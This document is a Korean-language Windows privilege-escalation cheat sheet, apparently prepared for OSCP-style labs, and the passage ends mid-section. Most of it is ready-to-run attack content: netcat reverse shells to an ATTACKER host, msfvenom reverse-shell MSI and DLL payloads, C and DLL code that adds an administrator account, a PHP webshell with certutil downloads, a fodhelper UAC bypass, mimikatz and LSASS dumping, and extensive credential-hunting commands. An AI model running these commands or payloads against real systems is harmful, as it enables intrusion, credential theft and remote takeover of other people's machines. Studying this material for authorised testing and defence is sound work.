#### Print Operators → SeLoadDriverPrivilege → 커널 드라이버 익스플로잇

Print Operators는 SeLoadDriverPrivilege를 받아 커널 드라이버를 로드할 수 있다. 취약 드라이버를 로드한 뒤 악용하는 복잡한 공격이다. OSCP 박스에서는 드물다 — 만나면 HackTricks 참조.

#### Remote Management Users

WinRM (5985) 접근을 직접 허용:

```bash
evil-winrm -i TARGET -u USER -p PASS
```

#### 그룹 멤버십 빠른 참조

- Server Operators — 서비스 중지/시작/재구성 — `sc.exe config` → SYSTEM
- Backup Operators — 임의 파일 읽기 (SeBackupPrivilege) — `reg save SAM` → secretsdump
- DnsAdmins — DNS 서비스에 DLL 로드 (SYSTEM) — `dnscmd` → SYSTEM
- Account Operators — 비관리 계정 생성/수정 — 자기istr을 그룹에 추가
- Print Operators — 커널 드라이버 로드 — 복잡함, HackTricks 참조
- Remote Management Users — WinRM 접근 — evil-winrm 쉘
- BUILTIN\Administrators — 로컬 admin — SAM 덤프, admin으로 실행
- Domain Admins — DA — DCSync, 어디든 PtH

#### SeDebugPrivilege → LSASS 덤프

```powershell
procdump.exe -ma lsass.exe lsass.dmp
# On Kali: pypykatz lsa minidump lsass.dmp
```

#### SeTakeOwnershipPrivilege

권한이 disabled이면 먼저 활성화:

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

파일 소유권 가져오기:

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

```text
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "SRV01\student".
```

소유권 변경 확인:

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

```text
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT SRV01\student
```

파일 ACL 수정 — 여전히 못 읽을 수 있으니 `icacls` 로 우리 유저에 full 권한 부여:

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant student:F
```

관심 파일 (SeTakeOwnership으로 노릴 만한 로컬 파일 예시):

```text
c:\inetpub\wwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

### Check 2 — WinPEAS와 PowerUp

```powershell
.\winpeas.exe cmd | Tee-Object -FilePath C:\Users\Public\winpeas.txt
# If hangs: .\winpeas.exe cmd > C:\Users\Public\wp.txt 2>&1
powershell -ep bypass ". .\PowerUp.ps1; Invoke-AllChecks"
```

PowerUp 표적 함수 (Invoke-AllChecks가 너무 시끄러울 때):

```powershell
# Import first
powershell -ep bypass
. .\PowerUp.ps1

# Service binary hijacking — finds services where current user can modify the binary
Get-ModifiableServiceFile

# Unquoted service paths — finds unquoted paths with spaces
Get-UnquotedService

# Exploit unquoted path (creates user john / Password123! by default)
Write-ServiceBinary -Name '<svc>' -Path "C:\Program Files\Vuln App\Current.exe"
Restart-Service <svc>

# Weak service DACLs — finds services current user can reconfigure
Get-ModifiableService
```

- 경고: PowerUp의 `Install-ServiceBinary` 는 서비스 바이너리 경로에 경로를 포함한 인자(`--defaults-file=C:\path` 등)가 있으면 조용히 실패할 수 있다. AbuseFunction이 에러나면 바이너리 교체를 수동으로 한다.

### Check 3 — 서비스 설정 오류

서비스/DLL/예약 작업 하이재킹용 페이로드:

```text
// adduser.c — creates admin user when executed as SYSTEM
#include <stdlib.h>
int main() {
    system("net user pwned Password123! /add");
    system("net localgroup administrators pwned /add");
    return 0;
}
```

Kali에서 크로스컴파일:

```bash
# Cross-compile on Kali
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe          # 64-bit EXE
x86_64-w64-mingw32-gcc adduser.cpp --shared -o evil.dll   # 64-bit DLL
```

- 경고: 서비스를 `net stop`/`net start` 할 수 없으면 `shutdown /r /t 0` (SeShutdownPrivilege 필요). Auto로 설정된 서비스는 재부팅 후 다시 시작된다.

#### Unquoted Service Paths

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\"\""
```

발견하면: Windows는 각 접두사 + `.exe` 를 왼쪽에서 오른쪽으로 시도하고 첫 매치가 이긴다. 파일명은 공백 앞의 다음 구성요소와 정확히 일치해야 한다(자유 선택 아님). 경로 `C:\Program Files\My App\service.exe` → `C:\Program.exe` 또는 `C:\Program Files\My.exe` 를 떨어뜨린다. 그 디렉터리에 쓰기 권한이 필요하다.

#### Writable Service Binaries

```powershell
icacls "C:\path\o\service.exe"
accesschk64.exe -uwcv Everyone *
accesschk64.exe /accepteula -uwcqv "Authenticated Users" *
```

쓰기 가능하면:

```powershell
sc config <vuln_svc> binpath= "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe"
sc stop <vuln_svc>
sc start <vuln_svc>
```

#### Weak Service DACLs

```powershell
accesschk64.exe -uwcqv <username> *
# If SERVICE_CHANGE_CONFIG on any service:
sc config <svc> binpath= "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe"
```

### Check 4 — 저장된 creds와 AutoLogon

```powershell
cmdkey /list
# If entries exist:
runas /savecred /user:Administrator "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe"

# AutoLogon in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>$null | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"
```

알려진 패스워드로 RunAs (GUI/RDP 필요 — 패스워드 프롬프트가 대화형):

```powershell
:: If you found a password for another user (config file, note, etc.)
runas /user:targetuser cmd
:: Enter password at the prompt. A new window opens as that user.
:: Does NOT work in bind shells or WinRM — the password prompt won't accept input.
:: Alternatives without GUI: evil-winrm, PSRemoting (Enter-PSSession), or scheduled tasks
```

### Check 5 — 패스워드 헌팅

- 경고: `C:\` 에서 `findstr` 이나 `dir /s` 를 돌리지 않는다 — 끝없는 쓰레기가 나온다. 항상 특정 디렉터리(유저 홈, 웹 루트, 프로그램 폴더)에서 검색.

#### Credential Theft 명령 모음

- `findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml` — "password" 문구가 든 파일 검색
- `gc 'C:\Users\student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password` — Chrome 사전 파일에서 패스워드 검색
- `(Get-PSReadLineOption).HistorySavePath` — PowerShell 히스토리 저장 경로 확인
- `gc (Get-PSReadLineOption).HistorySavePath` — PowerShell 히스토리 파일 읽기
- `$credential = Import-Clixml -Path 'C:\scripts\pass.xml'` — PowerShell creds 복호화
- `cd c:\Users\student\Documents & findstr /SI /M "password" *.xml *.ini *.txt` — 파일 내용에서 문자열 검색
- `findstr /si password *.xml *.ini *.txt *.config` — 파일 내용에서 문자열 검색
- `findstr /spin "password" *.*` — 파일 내용에서 문자열 검색
- `select-string -Path C:\Users\student\Documents\*.txt -Pattern password` — PowerShell로 파일 내용 검색
- `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*` — 확장자로 파일 검색
- `where /R C:\ *.config` — 확장자로 파일 검색
- `Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore` — PowerShell로 확장자 검색
- `cmdkey /list` — 저장된 creds 나열
- `.\SharpChrome.exe logins /unprotect` — 저장된 Chrome creds 복구
- `.\lazagne.exe -h` — LaZagne 도움말 보기
- `.\lazagne.exe all` — LaZagne 전체 모듈 실행
- `Invoke-SessionGopher -Target SRV01` — SessionGopher 실행
- `netsh wlan show profile` — 저장된 무선 네트워크 보기
- `netsh wlan show profile ilfreight_corp key=clear` — 저장된 무선 패스워드 복구

#### PowerShell 히스토리 (가장 먼저 — OSCP/PG에서 가장 흔함)

```powershell
:: CMD:
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
for /f "tokens=*" %u in ('dir /b C:\Users') do @type "C:\Users\%u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
```

```powershell
# PowerShell (evil-winrm):
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue
# All users:
Get-ChildItem -Path C:\Users -Recurse -Filter ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content
```

#### 기타 파일

AD 환경이면 Snaffler 같은 도구로 네트워크 공유 드라이브를 훑어 `.kdbx`, `.vmdk`, `.vdhx`, `.ppk` 등의 확장자를 찾는다. 마운트할 수 있는 가상 디스크에서 로컬 admin 해시, 다른 시스템 접근에 쓸 SSH 개인키, Excel/Word/OneNote에 저장된 패스워드, 고전인 `passwords.txt` 가 나올 수 있다. 공유 드라이브나 로컬 드라이브에서 찾은 패스워드는 초기 접근이나 권한 상승으로 이어지는 경우가 많다. 회사마다 직원별 공유 폴더(예: `FILE01` 서버의 `users` 공유에 유저 ID인 `bjones` 폴더)를 주는데 권한이 느슨해, 유저들이 네트워크 전체가 읽을 수 있다는 걸 모른 채 민감 데이터를 저장하곤 한다.

##### 파일시스템 수동 검색

파일 내용에서 문자열 검색 (cmd):

```powershell
cd c:\Users\student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

파일 내용 검색 (PowerShell):

```powershell
select-string -Path C:\Users\student\Documents\*.txt -Pattern password
```

확장자 검색 (cmd):

```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ *.config
```

확장자 검색 (PowerShell):

```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

- 참고: Get-History vs PSReadline — `Clear-History` 는 PowerShell 자체 Get-History 버퍼만 지운다. PSReadline 파일은 지우지 않는다. 대부분의 관리자는 히스토리를 지웠다고 생각하지만 파일은 그대로다.

```powershell
# Find the PSReadline history path (confirms location per user)
(Get-PSReadlineOption).HistorySavePath
```

#### Step 1b: PowerShell 트랜스크립트 (놓치기 쉬운 금맥)

PowerShell Transcription이 켜져 있으면 모든 명령+출력이 파일로 기록된다. `ConvertTo-SecureString`, `Enter-PSSession -Credential` 등의 평문 패스워드가 들어 있다.

```powershell
# Works in both CMD and PS:
Get-ChildItem -Path C:\ -Include *transcript* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\Public\Transcripts -ErrorAction SilentlyContinue
```

#### Step 2: 유저 홈 디렉터리에서 표적 검색

```powershell
:: CMD:
cd %USERPROFILE%
findstr /SIM /C:"pass" *.ini *.cfg *.xml *.txt *.config
```

```powershell
# PowerShell (evil-winrm):
cd $env:USERPROFILE
Get-ChildItem -Recurse -Include *.ini,*.cfg,*.xml,*.txt,*.config -ErrorAction SilentlyContinue | Select-String "pass" -List | Select Path
```

#### Step 3: 알려진 credential 위치 확인

```powershell
# These all work in PowerShell (use Get-Content, not type, if wildcards are needed)
Get-Content $env:APPDATA\FileZilla\recentservers.xml -ErrorAction SilentlyContinue
Get-Content $env:APPDATA\FileZilla\sitemanager.xml -ErrorAction SilentlyContinue
Get-Content C:\inetpub\wwwroot\web.config -ErrorAction SilentlyContinue
Get-Content C:\xampp\htdocs\wp-config.php -ErrorAction SilentlyContinue
Get-Content C:\xampp\phpMyAdmin\config.inc.php -ErrorAction SilentlyContinue
Get-Content C:\xampp\mysql\bin\my.ini -ErrorAction SilentlyContinue
Get-Content C:\Windows\Panther\Unattended.xml -ErrorAction SilentlyContinue
Get-Content C:\Windows\System32\sysprep\Unattend.xml -ErrorAction SilentlyContinue
Get-Content C:\ProgramData\McAfee\Common\Framework\SiteList.xml -ErrorAction SilentlyContinue
```

#### Step 4: 다른 유저 것 확인 (접근 가능하다면)

```powershell
# PowerShell (works in evil-winrm):
Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.xml,*.ini,*.kdbx,*.rdp -ErrorAction SilentlyContinue | Where-Object {$_.FullName -notlike '*AppData\Local\Microsoft*'} | Select FullName
Get-ChildItem -Path C:\Users\*\.ssh -ErrorAction SilentlyContinue | Select FullName
```

#### Step 5: AutoLogon 레지스트리 (평문 패스워드)

```powershell
# Works in both CMD and PS:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"
```

#### Step 6: Credential Manager

```powershell
cmdkey /list
:: If entries exist:
runas /savecred /user:Administrator "C:\Windows\Temp\nc.exe ATTACKER 80 -e cmd.exe"
```

#### Step 7: C:\ 의 비기본 디렉터리 검색

```powershell
# Look at C:\ root for anything unusual
Get-ChildItem C:\
# Then search inside suspicious directories
Get-ChildItem -Path C:\backup -Recurse -Include *.txt,*.xml,*.ini,*.config -ErrorAction SilentlyContinue | Select-String "pass" -List | Select Path
```

#### Step 8: 숨은 AppData — `dir` 로는 안 보이는 폴더

`dir C:\Users\Administrator` 는 AppData를 보여주지 않는다. 숨겨져 있다. 그런데 RDCMan, mRemoteNG, PuTTY, WinSCP, FileZilla 등의 저장 creds으로 가득하다. WinPEAS는 이 대부분을 확인하지 않는다.

숨은 AppData에서 "password"가 든 것 전부 찾는 한 줄 명령:

```powershell
Get-ChildItem -Path C:\Users\*\AppData -Recurse -Include *.xml,*.config,*.ini,*.txt,*.settings -Force -ErrorAction SilentlyContinue | Select-String -Pattern "password|credential|passwd" -List | Select Path
```

찾은 것은 읽는다:

```powershell
Get-Content "<PATH_FROM_ABOVE>" -ErrorAction SilentlyContinue
```

저장된 세션도 레지스트리에서 확인:

```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>$null
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" 2>$null
```

#### Step 9: PowerShell 표적 파일 검색

```powershell
# KeePass databases (crack with keepass2john)
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# Documents in current user's home
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

- 교훈 (Mice, PG): 유저 홈에서 `findstr /SIM /C:"pass" *.ini *.cfg *.xml` 로 FTP creds이 든 FileZilla XML을 찾은 사례. 구형 `dir /s /b C:\*pass*` 는 쓰레기만 수십 페이지 출력하고 아무것도 못 찾았다.

#### Sticky Notes 패스워드

StickyNotes 앱에 패스워드를 저장하는 유저가 많은데 DB 파일임을 모른다. 위치: `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` — 항상 찾아볼 가치가 있다.

PowerShell(PSSQLite 모듈: https://github.com/RamblingCookieMonster/PSSQLite)로 본다:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
cd .\PSSQLite\
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

DB 파일을 공격 박스로 복사한 뒤 `strings` 로 볼 수도 있다 (DB 크기에 따라 비효율일 수 있음):

```bash
strings plum.sqlite-wal
```

#### 기타 흥미로운 파일

creds이 나올 수 있는 파일들:

```text
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

#### 자동 credential 수집 도구

SessionGopher (현재 유저로 실행):

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target SRV01
```

모든 유저의 `HKEY_USERS` 세션 정보를 가져오려면 로컬 admin이 필요하지만, 현재 유저로도 실행해 유용한 creds이 나오는지 보면 항상 이득이다.

LaZagne 전체 모듈:

```powershell
.\lazagne.exe all
```

보호된 파일 크랙:

```bash
pdf2john file.pdf > hash.txt
zip2john file.zip > hash.txt
keepass2john file.kdbx > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Check 6 — AlwaysInstallElevated

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

둘 다 `0x1` 이면:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f msi -o evil.msi
# Transfer, then: msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

### Check 7 — SAM/SYSTEM 백업

```powershell
dir C:\Windows\Repair\SAM
dir C:\Windows\Repair\SYSTEM
dir C:\Windows\System32\config\RegBack\SAM
dir C:\Windows\System32\config\RegBack\SYSTEM
```

접근 가능하면:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Check 8 — 예약 작업

작업마다 답할 세 가지 질문:

- 누구로 실행하나? (Run As User가 SYSTEM이나 admin이면 악용할 가치)
- 언제 실행하나? (Next Run Time — 미래이거나 반복이어야 한다)
- 무엇을 실행하나? (Task To Run — 바이너리/스크립트를 우리가 쓸 수 있는가?)

```powershell
:: Full dump (verbose)
schtasks /query /fo LIST /v
:: Filtered views
schtasks /query /fo LIST /v | findstr /i "Task To Run" | findstr /i /v "system32"
schtasks /query /fo LIST /v | findstr /i "Run As User" | findstr /i "SYSTEM\|Administrator"
```

악용: 서비스 바이너리 하이재킹과 동일 — 스크립트/바이너리를 내 페이로드로 교체.

```powershell
:: Check if you can write to the binary location
icacls "C:\path\to\scheduled\binary.exe"
:: If writable, replace with adduser.exe or nc.exe reverse shell
move C:\path\to\binary.exe binary.exe.bak
copy C:\Windows\Temp\adduser.exe C:\path\to\binary.exe
:: Wait for the scheduled task to fire
```

- 부모 디렉터리만 쓰기 가능하면: `del binary.exe` + `copy malicious.exe binary.exe` (ACL 상속으로 디렉터리 쓰기는 되는데 파일 쓰기는 안 되는 경우가 있다)
- 수동 트리거: `schtasks /run /tn "TaskName"` — 일부 작업에 동작하며 `Next Run Time` 대기를 건너뛴다. 대기 계획 전에 먼저 시도.

### Check 9 — 설치 소프트웨어와 비기본 디렉터리

```powershell
wmic product get name,version,vendor
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

```powershell
# Registry-based app list (more complete than wmic — catches apps wmic misses)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

중요: C:\ 루트의 비기본 디렉터리를 항상 확인:

```powershell
dir C:\
```

`Windows`, `Program Files`, `Users`, `PerfLogs`가 아닌 것을 찾는다. `C:\ftp`, `C:\backup`, `C:\work`, `C:\dev`, `C:\tools` 같은 디렉터리는 의도적으로 놓인 것이고 단서를 담고 있다.

### Check 10 — DLL 하이재킹

DLL 검색 순서 (safe mode 활성 — 최신 Windows 전부 기본):

1. 애플리케이션 디렉터리
2. 시스템 디렉터리 (System32)
3. 16비트 시스템 디렉터리
4. Windows 디렉터리
5. 현재 디렉터리
6. PATH 환경 변수 디렉터리

```powershell
echo %PATH%
:: Check for writable directories in PATH
icacls "C:\some\path\in\PATH"
```

방법론:

1. 타깃 바이너리를 테스트 VM으로 복사, 설치, Procmon(Process Monitor)을 admin으로 실행
2. Procmon에서 필터: Process Name이 `target.exe`, Operation이 `CreateFile`, Path에 `.dll` 포함, Result가 `NAME NOT FOUND`
3. 앱 디렉터리에서 `NAME NOT FOUND` 인 DLL = 심을 수 있는 빠진 DLL
4. 그 디렉터리에 쓰기 가능한지 확인: `echo test > "C:\App Dir\test.txt"`
5. 악성 DLL 크로스컴파일 후 그곳에 배치

악성 DLL 템플릿 (C++):

```text
// evil.cpp — DLL_PROCESS_ATTACH fires when the DLL is loaded
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user pwned Password123! /add");
            system("net localgroup administrators pwned /add");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

Kali에서 DLL 크로스컴파일:

```bash
# Cross-compile DLL on Kali
x86_64-w64-mingw32-gcc evil.cpp --shared -o TextShaping.dll
```

또는 msfvenom (더 간단, 하지만 AV에 걸릴 수 있음):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=y -f dll -o evil.dll
```

- 경고: DLL은 앱을 시작한 자의 권한으로 실행된다. low-priv 유저가 실행하면 low-priv 실행만 얻는다. high-priv 유저가 앱을 실행하게 기다리거나 유도한다.

### Check 11 — 내부 서비스

```powershell
netstat -ano | findstr LISTENING
```

`127.0.0.1` 에 바인딩된 서비스를 찾는다 — 외부 nmap 스캔에 안 보이고 SYSTEM으로 도는 경우가 있다.
참고: `0.0.0.0` 은 모든 인터페이스(localhost 포함)에서 리스닝. `127.0.0.1` 은 localhost 전용.

각 포트의 프로세스 식별:

```powershell
:: Admin required:
netstat -anob
:: Non-admin — look up individual PIDs:
tasklist /FI "PID eq 4260"
:: If tasklist is access-denied, try:
Get-Process -Id 4260 | Select-Object Name,Path
```

한 줄 명령: 모든 리스닝 포트를 프로세스명에 매핑 (admin 불필요):

```powershell
Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess,@{Name='Process';Expression={(Get-Process -Id $_.OwningProcess).Name}} | Sort-Object LocalPort
```

evil-winrm 경유 MySQL 상호작용 (비대화형):

Evil-WinRM은 대화형 프롬프트(`mysql -u root -p` 등)에서 멈춘다. 비대화형 플래그를 쓴다:

```powershell
:: From C:\xampp\mysql\bin:
.\mysql.exe -u root --password=""
.\mysql.exe -u root -e "SHOW DATABASES;"
.\mysql.exe -u root -e "SELECT user,host FROM mysql.user;"
.\mysql.exe -u root -e "USE wordpress; SELECT * FROM wp_users;"
```

`-e` 플래그는 쿼리 실행 후 종료 — 대화형 프롬프트 없음, 멈춤 없음.
XAMPP MySQL은 root 패스워드가 비어 있는 경우가 많다. 항상 `--password=""` 부터 시도.

localhost 서비스 상호작용 (PowerShell):

```powershell
# PowerShell 'curl' is an alias for Invoke-WebRequest — NOT linux curl
curl http://127.0.0.1/?test -UseBasicParsing              # -UseBasicParsing required
(curl http://127.0.0.1/?test -UseBasicParsing).RawContent  # .RawContent for readable text
# .Content may return byte arrays — use .RawContent instead

# Alternative: Invoke-WebRequest explicitly
(Invoke-WebRequest -Uri "http://127.0.0.1:8080/api" -UseBasicParsing).Content
```

localhost 서비스를 공격 박스로 포워드:

```bash
# Chisel
# Attacker: ./chisel server -p 9999 --reverse
# Target: .\chisel.exe client ATTACKER:9999 R:80:127.0.0.1:80
# Then browse http://127.0.0.1:80 on Kali
```

- 흔한 실수: 서비스가 `127.0.0.1:1337` 에 바인딩되어 있으면 chisel 포워드도 반드시 `127.0.0.1:1337` 을 써야 한다 — 머신의 외부 IP가 아니다. 서비스는 루프백 연결만 받는다.

### Check 12 — UAC Bypass

```powershell
whoami /groups | findstr /i "Medium Mandatory"
```

Medium integrity + 로컬 admin이면:

```powershell
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
```

### Check 13 — Credential Dumping

```powershell
lazagne.exe all
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

### Checks 14-18 — 추가 벡터

```powershell
# 14. Browser saved passwords
dir /s /b C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data

# 15. WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

# 16. Clipboard
powershell -c "Get-Clipboard"

# 17. Mapped drives and shares
net use
net share

# 18. Kernel exploits (LAST RESORT)
systeminfo > systeminfo.txt
# Transfer to Kali: python wes.py systeminfo.txt
```

### 웹셸 경유 Lateral Movement (유저에게 privesc 경로가 전혀 없을 때)

현재 유저에게 SeImpersonate도, 서비스 설정 오류도, 아무것도 없으면 — 웹 서버가 도는지 확인한다. 웹 루트에 쓸 수 있고 웹 서버가 다른 유저로 실행 중이면 웹셸로 피벗할 수 있다.

```powershell
# 1. Check if you can write to web root
echo "test" > C:\xampp\htdocs\test.txt

# 2. Drop a PHP webshell
Set-Content -Path "C:\xampp\htdocs\cmd.php" -Value '<?php system($_GET["cmd"]); ?>'

# 3. From Kali, check who the web server runs as
curl "http://TARGET/cmd.php?cmd=whoami"
curl "http://TARGET/cmd.php?cmd=whoami+/all"
# If SeImpersonatePrivilege = Enabled → get shell as that user → potato → SYSTEM

# 4. Transfer tools via webshell
curl "http://TARGET/cmd.php?cmd=certutil+-urlcache+-split+-f+http://ATTACKER/nc.exe+C:\xampp\htdocs\nc.exe"

# 5. Get reverse shell as web server user
curl "http://TARGET/cmd.php?cmd=C:\xampp\htdocs\nc.exe+ATTACKER+443+-e+cmd.exe"
```

흔한 웹 루트: `C:\xampp\htdocs`, `C:\inetpub\wwwroot`, `C:\wamp\www`

### 자동 도구가 아무것도 못 찾을 때

WinPEAS, whoami /priv, 서비스 확인이 전부 비었으면 당황하지 않는다. privesc은 정보 기반이다:

- `dir C:\` — 비기본 디렉터리 찾기. 커스텀인 것은 전부 단서다.
- 접근 가능한 모든 것 읽기 — 홈 디렉터리, Desktop, Documents, 웹 루트, 설정 파일. 패스워드 보호 파일은 크랙.
- `netstat -ano | findstr LISTENING` — localhost 전용 서비스 찾기. 더 높은 권한 계정으로 도는 경우가 많고 외부 스캔에 안 보인다.
- 실행 중인 프로세스 확인 — `tasklist /v` 로 SYSTEM으로 도는 특이한 경로의 서비스.
- 재열거 — 새 정보가 생기면 다시 검색.

패턴: 파일 발견 → 크랙 → 읽기 → 숨은 서비스 발견 → 사용.

### Windows 그룹 멤버십과 재로그인

중요한 함정: 그룹에 유저 추가(예: `net localgroup Administrators user /add`)는 현재 세션에 즉시 적용되지 않는다.

Windows는 로그인 시점에 그룹 멤버십을 담은 access token을 만든다. 그 토큰은 세션 내내 고정이다. 새 그룹 멤버십을 받으려면 완전히 새 세션을 시작해야 한다:

```powershell
# After adding to a group:
exit                    # close current session
ssh user@target         # new SSH = new token
# or new RDP session, or runas
```

### 전체 토큰 권한 참조 (Check 1 확장)

- SeImpersonatePrivilege — 임의 토큰 사칭 — Potato 공격 → SYSTEM
- SeAssignPrimaryTokenPrivilege — 프로세스에 토큰 할당 — SeImpersonate와 동일 → Potato
- SeBackupPrivilege — 임의 파일 읽기 — `reg save SAM/SYSTEM` → secretsdump
- SeRestorePrivilege — 임의 파일 쓰기 — 서비스 바이너리/DLL 덮어쓰기
- SeTakeOwnershipPrivilege — 임의 객체 소유권 획득 — 소유권 → ACL 수정 → 읽기/쓰기
- SeDebugPrivilege — 임의 프로세스 디버그 — LSASS 덤프 → Mimikatz
- SeLoadDriverPrivilege — 커널 드라이버 로드 — 취약 드라이버 로드 → 커널 익스플로잇

### 추가 Potato 변형

- PrintSpoofer — Print Spooler 실행 중. 가장 간단. 먼저 시도.
- GodPotato — 호환성 가장 넓음. 두 번째 시도.
- SharpEfsPotato — EFS 서비스 이용. 다른 것이 실패할 때 대안.
- RoguePotato — Server 2019+. Kali 릴레이 필요.
- SweetPotato — 여러 기법 조합.

```powershell
:: SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd"

:: RoguePotato (needs socat on Kali: socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999)
RoguePotato.exe -r KALI_IP -e "C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe" -l 9999
```

Potato가 실패할 때:

- PrintSpoofer 실패 → Print Spooler 비활성. 확인: `sc query spooler`
- JuicyPotato 실패 → CLSID 또는 OS 불일치. 다른 CLSID 시도.
- 전부 실패 → SeImpersonatePrivilege가 "Disabled" 표시일 수 있다. 다른 벡터를 찾는다.

### Phantom DLL 하이재킹

어떤 앱은 시스템 어디에도 존재하지 않는 DLL을 로드하려 한다. PATH의 디렉터리가 쓰기 가능하면 거기 DLL을 심을 수 있다.

```powershell
:: Check for writable directories in PATH
echo %PATH%
icacls "C:\some\path\in\PATH"
:: If writable: place your malicious DLL with the exact name the app expects
copy evil.dll "C:\writable\path\missing.dll"
```

```powershell
# PS: check each PATH directory
$env:PATH -split ';' | ForEach-Object { icacls $_ 2>$null }
```

- Phantom DLL은 Process Monitor로 찾는다 (필터: Result=NAME NOT FOUND, Path가 .dll로 끝)

### 쓰기 가능한 서비스 바이너리 하이재킹 (단계별)

WinPEAS가 이렇게 보여준다면:

```text
